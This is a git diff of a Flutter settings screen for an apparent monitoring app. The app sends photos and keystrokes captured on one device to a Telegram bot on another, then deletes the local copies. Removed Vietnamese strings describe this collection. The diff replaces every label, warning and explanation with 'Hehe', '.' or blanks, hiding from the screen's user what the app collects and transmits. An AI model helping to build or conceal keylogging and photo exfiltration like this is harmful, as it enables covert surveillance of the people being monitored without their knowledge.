@@ -77,19 +77,13 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
       });
       if (mounted) {
         ScaffoldMessenger.of(context).showSnackBar(
-          const SnackBar(
-            content: Text('Đã dán từ bộ nhớ tạm'),
-            duration: Duration(seconds: 1),
-          ),
+          const SnackBar(content: Text('Hehe'), duration: Duration(seconds: 1)),
         );
       }
     } else {
       if (mounted) {
         ScaffoldMessenger.of(context).showSnackBar(
-          const SnackBar(
-            content: Text('Bộ nhớ tạm đang trống'),
-            duration: Duration(seconds: 1),
-          ),
+          const SnackBar(content: Text('Hehe'), duration: Duration(seconds: 1)),
         );
       }
     }
@@ -101,10 +95,7 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
 
     if (token.isEmpty || chatId.isEmpty) {
       ScaffoldMessenger.of(context).showSnackBar(
-        const SnackBar(
-          content: Text('Vui lòng nhập cả BOT_TOKEN và CHAT_ID trước khi test'),
-          backgroundColor: Colors.orange,
-        ),
+        const SnackBar(content: Text('Hehe'), backgroundColor: Colors.orange),
       );
       return;
     }
@@ -136,13 +127,11 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
 
     setState(() => _isSaving = true);
 
-    // Lưu vào SharedPreferences của Flutter
     final prefs = await SharedPreferences.getInstance();
     await prefs.setString('telegram_bot_token', token);
     await prefs.setString('telegram_chat_id', chatId);
     await prefs.setBool('telegram_sync_enabled', _syncEnabled);
 
-    // Đồng bộ xuống native Android
     await MonitorService.saveTelegramConfig(
       botToken: token,
       chatId: chatId,
@@ -152,10 +141,7 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
     if (mounted) {
       setState(() => _isSaving = false);
       ScaffoldMessenger.of(context).showSnackBar(
-        const SnackBar(
-          content: Text('Đã lưu cấu hình Telegram thành công!'),
-          backgroundColor: Colors.green,
-        ),
+        const SnackBar(content: Text('Hehe'), backgroundColor: Colors.green),
       );
     }
   }
@@ -178,19 +164,11 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
 
       if (error.isNotEmpty && texts == 0 && photos == 0) {
         ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(
-            content: Text('Đồng bộ thất bại: $error'),
-            backgroundColor: Colors.red,
-          ),
+          SnackBar(content: Text('Hehe'), backgroundColor: Colors.red),
         );
       } else {
         ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(
-            content: Text(
-              'Đã gửi $photos ảnh và $texts mục text lên Telegram, dọn sạch bộ nhớ Máy 1.',
-            ),
-            backgroundColor: Colors.green,
-          ),
+          SnackBar(content: Text('Hehe'), backgroundColor: Colors.green),
         );
       }
     }
@@ -202,7 +180,7 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
 
     return Scaffold(
       appBar: AppBar(
-        title: const Text('Cấu hình Telegram Máy 2'),
+        title: const Text('Cấu hình Hehe'),
         actions: [
           IconButton(
             icon: const Icon(Icons.refresh),
@@ -233,7 +211,7 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
                     const SizedBox(width: 10),
                     Expanded(
                       child: Text(
-                        'Token và Chat ID được lưu trực tiếp trên thiết bị này và không bao giờ chia sẻ ra ngoài. Bạn chỉ cần tự nhập 1 lần duy nhất.',
+                        'Hehe',
                         style: TextStyle(
                           color: Colors.blue.shade900,
                           fontSize: 13,
@@ -246,7 +224,6 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
               ),
               const SizedBox(height: 16),
 
-              // Thẻ bật/tắt gửi tự động
               Card(
                 elevation: 0,
                 color: _syncEnabled
@@ -262,13 +239,11 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
                 ),
                 child: SwitchListTile(
                   title: const Text(
-                    'Tự động gửi lên Telegram',
+                    '',
                     style: TextStyle(fontWeight: FontWeight.bold),
                   ),
                   subtitle: Text(
-                    _syncEnabled
-                        ? 'Ảnh và phím gõ sẽ tự động gửi về Telegram. Sau khi gửi thành công sẽ xoá ngay file ảnh và SQLite trên máy này.'
-                        : 'Đang tạm dừng gửi. Dữ liệu sẽ lưu tạm trong máy.',
+                    _syncEnabled ? '.' : 'Đ.',
                     style: TextStyle(fontSize: 12, color: Colors.grey.shade700),
                   ),
                   value: _syncEnabled,
@@ -279,14 +254,13 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
               ),
               const SizedBox(height: 16),
 
-              // Ô 1: BOT_TOKEN
               const Text(
-                '1. Telegram Bot Token',
+                '.',
                 style: TextStyle(fontWeight: FontWeight.bold, fontSize: 15),
               ),
               const SizedBox(height: 4),
               Text(
-                'Lấy từ @BotFather trên Máy 2 (dạng: 7891234567:AAF_...)',
+                '.',
                 style: TextStyle(fontSize: 12, color: Colors.grey.shade600),
               ),
               const SizedBox(height: 8),
@@ -294,7 +268,7 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
                 controller: _tokenController,
                 obscureText: _obscureToken,
                 decoration: InputDecoration(
-                  hintText: 'Dán BOT_TOKEN vào đây',
+                  hintText: '.',
                   prefixIcon: const Icon(Icons.vpn_key_outlined),
                   border: OutlineInputBorder(
                     borderRadius: BorderRadius.circular(10),
@@ -329,19 +303,7 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
                   ),
                 ),
               ),
-              const SizedBox(height: 20),
 
-              // Ô 2: CHAT_ID
-              const Text(
-                '2. Telegram Chat ID',
-                style: TextStyle(fontWeight: FontWeight.bold, fontSize: 15),
-              ),
-              const SizedBox(height: 4),
-              Text(
-                'Lấy từ @userinfobot trên Máy 2 (dạng dãy số: 1234567890)',
-                style: TextStyle(fontSize: 12, color: Colors.grey.shade600),
-              ),
-              const SizedBox(height: 8),
               TextFormField(
                 controller: _chatIdController,
                 keyboardType: TextInputType.number,
@@ -372,7 +334,6 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
               ),
               const SizedBox(height: 20),
 
-              // Kết quả kiểm tra kết nối nếu có
               if (_testResult != null) ...[
                 Container(
                   padding: const EdgeInsets.all(12),
@@ -417,7 +378,6 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
                 const SizedBox(height: 16),
               ],
 
-              // Hai nút thao tác chính: Test kết nối & Lưu
               Row(
                 children: [
                   Expanded(
@@ -464,15 +424,9 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
               const SizedBox(height: 12),
 
               // Thẻ dọn dẹp & Gửi bù dữ liệu chưa gửi
-              Text(
-                'Dữ liệu lưu tạm trên Máy 1',
-                style: theme.textTheme.titleMedium?.copyWith(
-                  fontWeight: FontWeight.bold,
-                ),
-              ),
               const SizedBox(height: 4),
               Text(
-                'Khi mất mạng, dữ liệu sẽ tạm giữ lại ở đây. Bấm nút bên dưới để gửi bù ngay lập tức.',
+                '',
                 style: TextStyle(fontSize: 12, color: Colors.grey.shade600),
               ),
               const SizedBox(height: 12),
@@ -522,50 +476,12 @@ class _TelegramSettingsScreenState extends State<TelegramSettingsScreen> {
               ),
               const SizedBox(height: 24),
 
-              // Hướng dẫn nhanh cho người dùng
               Card(
                 elevation: 0,
                 color: Colors.amber.shade50,
                 shape: RoundedRectangleBorder(
                   borderRadius: BorderRadius.circular(10),
                   side: BorderSide(color: Colors.amber.shade300),
-                ),
-                child: Padding(
-                  padding: const EdgeInsets.all(12),
-                  child: Column(
-                    crossAxisAlignment: CrossAxisAlignment.start,
-                    children: [
-                      Row(
-                        children: [
-                          Icon(
-                            Icons.tips_and_updates_outlined,
-                            color: Colors.amber.shade900,
-                            size: 20,
-                          ),
-                          const SizedBox(width: 8),
-                          Text(
-                            'Lưu ý quan trọng trên Máy 2 (Telegram):',
-                            style: TextStyle(
-                              fontWeight: FontWeight.bold,
-                              color: Colors.amber.shade900,
-                              fontSize: 13,
-                            ),
-                          ),
-                        ],
-                      ),
-                      const SizedBox(height: 6),
-                      Text(
-                        '1. Sau khi tạo bot bằng @BotFather, bạn BẮT BUỘC phải bấm vào link bot (t.me/tên_bot) và nhấn nút START.\n'
-                        '2. Nếu chưa nhấn START, Telegram sẽ chặn bot gửi tin nhắn và báo lỗi "chat not found".\n'
-                        '3. Nhập xong Token và Chat ID, hãy bấm nút "Test kết nối" ở trên để kiểm tra trước.',
-                        style: TextStyle(
-                          fontSize: 12,
-                          color: Colors.amber.shade900,
-                          height: 1.4,
-                        ),
-                      ),
-                    ],
-                  ),
                 ),
               ),
             ],
